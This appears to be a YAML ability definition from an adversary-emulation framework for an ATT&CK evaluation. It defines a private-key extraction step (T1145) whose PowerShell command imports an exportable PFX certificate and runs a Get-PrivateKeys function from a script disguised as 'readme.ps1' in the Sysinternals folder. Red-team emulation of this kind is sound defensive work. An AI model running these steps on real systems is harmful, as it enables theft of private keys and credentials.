- id: c4f4b13c-87b6-498c-b814-93570173068c
  name: 6.B.1 - Credentials In Files (T1081) - Private Keys Extraction
  description: Obtain credentials via Custom PowerShell
  tactic: credential-access
  technique:
    attack_id: T1145
    name: Private Keys
  platforms:
    windows:
      psh,pwsh:
        command: "Import-PfxCertificate -Exportable -FilePath \".\\dmevals.local.pfx\"\
          \ -CertStoreLocation Cert:\\LocalMachine\\My;\n\nif (! $(test-path -path\
          \ \"C:\\Program Files\\SysinternalsSuite\")) {\n\twrite-host \"[!] The path\
          \ C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\"\
          ;\n\texit 1;\n}\nSet-Location -path \"C:\\Program Files\\SysinternalsSuite\"\
          ;\n. .\\readme.ps1;\nGet-PrivateKeys;\nif ($? -eq $True) {\n    write-host\
          \ \"[+] Successfully executed private key collection script.\";\n    exit\
          \ 0;\n} else {\n    write-host \"[!] Error, could not execution Get-PrivateKeys.\"\
          ;\n    exit 1;\n}\n"
        payload: dmevals.local.pfx
